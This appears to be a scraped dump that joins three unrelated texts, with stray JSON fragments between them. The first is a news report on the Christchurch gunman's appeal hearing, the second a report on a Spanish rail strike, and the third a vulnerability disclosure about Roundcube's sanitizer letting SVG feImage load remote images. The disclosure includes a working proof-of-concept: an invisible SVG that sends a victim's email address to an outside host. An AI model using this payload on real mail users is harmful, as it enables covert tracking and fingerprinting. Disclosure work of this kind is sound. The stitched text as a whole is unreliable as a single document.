Photograph: Sanka Vidanagama/AFP/Getty Images View image in fullscreen Police vehicles outside Al Noor Mosque in Christchurch in 2021. Photograph: Sanka Vidanagama/AFP/Getty Images Christchurch gunman seeks to appeal convictions and withdraw guilty plea Australian white supremacist tells NZ court he was suffering from ‘nervous exhaustion’ when he entered his guilty plea in March 2020 The Australian white supremacist who murdered 51 Muslim worshippers at two mosques in Christchurch in 2019, in the worst mass shooting in the New Zealand’s history, has asked a court to discard his guilty pleas, claiming harsh prison conditions had affected his mental health and compelled him to admit to the crimes. Brenton Tarrant pleaded guilty in March 2020 to 51 counts of murder, 40 counts of attempted murder and a terrorism charge, after initially saying he would defend the charges. In August 2020, Tarrant became the first person in New Zealand under current laws to be sentenced to life in prison without the chance of ever walking free. But in 2022 he filed an appeal at the court of appeal , for both his convictions and his sentence. The court will consider whether the appeal can proceed because it was filed outside the legislated time frame to do so. The 35-year-old gave evidence via video link on 9 February, as part of a week-long hearing in Wellington. In front of a panel of three judges, Tarrant said his mental health had deteriorated due to conditions in prison, where he was held in solitary confinement, with limited reading material or contact with other prisoners. He said he was suffering “nervous exhaustion” by the time he entered his guilty pleas, and he had admitted to the crimes just months before his trial was due to begin because he felt there was “little else I could do”. Crown lawyer Barnaby Hawes challenged Tarrant, suggesting there was little evidence he had been in serious mental crisis. Hawes said Tarrant had other options, including delaying his trial date on mental health grounds, or defending himself at trial. Tarrant, a self-declared white supremacist, said he had masked his mental illness, partly driven by the “political movement I’m a part of”. He said he had made a late application because he had not had access to the information required to make it. According to court documents, the court will be primarily considering the application to vacate the guilty pleas. “The central issue before the court will be whether at the time Mr Tarrant entered his guilty pleas he was incapable of making rational decisions as a result of the conditions of his imprisonment, which he says were torturous and inhumane,” it said. The judges are expected to release a decision at a later date. If the court grants the application to vacate the pleas, the case will be sent back to the high court for the terrorist to stand trial. If it declines the application then a further hearing will consider the sentence appeal later this year Security has been ramped up at the court, with only media, counsel and authorised people permitted to attend the hearing inside the courtroom. Limited space for the public has been made in an adjoining room, while provision has been made for victims and family members to view the hearing in Christchurch via a delayed broadcast. Tarrant’s legal counsel have been granted permanent name suppression. Aya Al-Umari, whose brother Hussein al-Umari was murdered at Masjid al-Noor, told The Post the hearing made her uncomfortable and listening to Tarrant give evidence for the first time would be difficult. “For the sake of my sanity … I have to think of them as just words with absolutely no meaning behind them,” she said. “But at the same time it is reopening a wound that you try so hard to close and try and move forward with life.” Tarrant moved to New Zealand in 2017 planning to carrying out a white supremacist attack. He planned the mass shooting for months, conducted reconnaissance at the mosques, distributed a manifesto expressing his racist views before he opened fire, and livestreamed part of the assault on Facebook. In the wake of the attacks, the former Jacinda Ardern-led government banned military-style semi-automatic rifles and created a firearms registry. An inquiry into the attacks is the largest coronial investigation New Zealand has seen and is still under way. In October 2025, the high court left the door open for Tarrant to be called as a witness at the inquest, despite objections from survivors and families of the victims.

      "content": "Share Save Share Save Getty Images Train drivers in Spain are due to begin a three-day nationwide strike on Monday in protest of what they say is a lack of safety guarantees on the country&#x27;s rail system. The action follows two fatal train crashes in January, one in Adamuz in the country&#x27;s southern region which killed 46 people, and the second just two days later near Barcelona where a train driver died and dozens were injured. The accidents have caused severe disruption for travellers and cast doubt on Spain&#x27;s much-vaunted rail system. Semaf, the train drivers&#x27; union, are demanding the hiring of more staff and increased investment and maintenance in what it has described as &quot;the constant deterioration of the rail network&quot;. Following the two collisions, subsequent safety checks also revealed faults and maintenance issues on a number of routes. Spain&#x27;s Prime Minister Pedro Sánchez is due to be grilled in parliament later this week about the failures in the rail system. The accident in Adamuz on 18 January, where a high-speed train derailed and collided with another travelling in the opposite direction was the country&#x27;s worst rail disaster in more than a decade . A preliminary report by rail accident investigation commission CIAF has found that grooves found on the wheels of the derailed train and three earlier trains suggests that a fracture in the track occurred before the train went over it. Just two days later in Catalonia, a trainee driver was killed and at least 37 passengers were injured when a collapsed wall caused another local train to derail. Rail officials believe the wall collapsed as the train was passing, striking the driver&#x27;s cab first and then causing considerable damage to the first carriage of the train in which most of the injured passengers were travelling. Semaf has previously said the collisions represent &quot;a turning point in demanding that all necessary actions be taken to guarantee the safety of railway operations&quot;. The amount of investment the rail network receives has come under particular scrutiny. The Socialist-led government has sought to dismiss such queries, pointing out that €700m (£605m) has been invested in updating the Madrid-Andalusia line in recent years, with the stretch of track where the accident took place included in that renovation. &quot;We&#x27;re not looking at a problem of lack of maintenance, we&#x27;re not looking at a problem of obsolete [infrastructure], and we&#x27;re not looking at a problem of lack of investment,&quot; said Transport Minister Óscar Puente.

      "content": "TL;DR: Roundcube&rsquo;s rcube_washtml sanitizer blocked external resources on &lt;img> , &lt;image> , and &lt;use> , but not on &lt;feImage> . Its href went through the wrong code path and got allowed through. Attackers could track email opens even when &ldquo;Block remote images&rdquo; was on. Fixed in 1.5.13 and 1.6.13. Vulnerability information # Field Value Vendor Roundcube Product Roundcube Webmail Affected versions &lt; 1.5.13, 1.6.x &lt; 1.6.13 Fixed in 1.5.13, 1.6.13 Disclosure date 2026-02-08 Background # When allow_remote is false, Roundcube&rsquo;s sanitizer intercepts image-bearing attributes ( src on &lt;img> , href on &lt;image> and &lt;use> ) and runs them through is_image_attribute() . That function blocks external URLs. Separately, non-image URLs (like &lt;a href> ) go through wash_link() , which lets HTTP/HTTPS URLs through. That&rsquo;s fine for links the user clicks on intentionally. Discovery # I got bored during my christmas vacation and this SVG-based XSS fix via the animate tag appeared on my radar. One SVG bug usually means more. 1 So I spent some time going through rcube_washtml.php , looking at which SVG elements made it onto the allowlist and how their attributes get handled and sanitized. &lt;feImage> stood out. 2 Its href gets fetched on render, same as &lt;img src> . But the sanitizer sends it through wash_link() instead of is_image_attribute() . So the &ldquo;Block remote images&rdquo; setting doesn&rsquo;t apply to it. Technical details # In wash_attribs() , every attribute hits a chain of checks. The first one that matches wins: rcube_washtml.php if ( $this -&gt; is_image_attribute ( $node -&gt; nodeName , $key )) { $out = $this -&gt; wash_uri ( $value , true ); // blocks remote URLs } elseif ( $this -&gt; is_link_attribute ( $node -&gt; nodeName , $key )) { $out = $this -&gt; wash_link ( $value ); // allows http/https } Before the fix, is_image_attribute() looked like this: rcube_washtml.php private function is_image_attribute ( $tag , $attr ) { return $attr == &#39;background&#39; || $attr == &#39;color-profile&#39; || ( $attr == &#39;poster&#39; &amp;&amp; $tag == &#39;video&#39; ) || ( $attr == &#39;src&#39; &amp;&amp; preg_match ( &#39;/^(img|image|source|input|video|audio)$/i&#39; , $tag )) || ( $tag == &#39;use&#39; &amp;&amp; $attr == &#39;href&#39; ) || ( $tag == &#39;image&#39; &amp;&amp; $attr == &#39;href&#39; ); } The href attribute is only matched for use and image . No feimage . And is_link_attribute() is a catch-all 3 : rcube_washtml.php private function is_link_attribute ( $tag , $attr ) { return $attr === &#39;href&#39; ; } So when the sanitizer encounters &lt;feImage href=\"https://...\"> : is_image_attribute('feimage', 'href') returns false, is_link_attribute('feimage', 'href') returns true, and the URL goes through wash_link() which passes HTTP/HTTPS URLs straight through. Proof of concept # An invisible 1x1 SVG, positioned off-screen: &lt; svg width = &#34;1&#34; height = &#34;1&#34; style = &#34;position:absolute;left:-9999px;&#34; &gt; &lt; defs &gt; &lt; filter id = &#34;t&#34; &gt; &lt; feImage href = &#34;https://httpbin.org/image/svg?email=victim@test.com&#34; width = &#34;1&#34; height = &#34;1&#34; /&gt; &lt;/ filter &gt; &lt;/ defs &gt; &lt; rect filter = &#34;url(#t)&#34; width = &#34;1&#34; height = &#34;1&#34; /&gt; &lt;/ svg &gt; The browser evaluates the SVG filter and fires a GET to the attacker&rsquo;s URL. Impact # The &ldquo;Block remote images&rdquo; setting doesn&rsquo;t block this remote image. An attacker can confirm you opened it, log your IP, and fingerprint your browser. Remediation # The fix ( 26d7677 ) collapses the two separate use / image checks into a single regex that includes feimage : rcube_washtml.php || ( $attr == &#39;href&#39; &amp;&amp; preg_match ( &#39;/^(feimage|image|use)$/i&#39; , $tag )); // SVG Now &lt;feImage href> hits is_image_attribute() first, gets routed through wash_uri() , and the remote URL is blocked. Update to 1.5.13 or 1.6.13. Timeline # Date Event 2026-01-04 Reported to Roundcube 2026-02-08 1.5.13 and 1.6.13 released 2026-02-08 This post The SVG spec is enormous and most sanitizers only handle the common elements. Whenever one SVG tag slips through, there are usually others on the same allowlist that nobody checked.&#160; &#8617;&#xfe0e; It&rsquo;s an SVG filter primitive that loads an external image and uses it as input to a filter chain ( spec ). Rarely used in practice, which is probably why it was overlooked. Allowlists that grow by hand tend to have gaps like this.&#160; &#8617;&#xfe0e; This matches href on every element, including &lt;feImage> . That&rsquo;s the root cause.&#160; &#8617;&#xfe0e;",
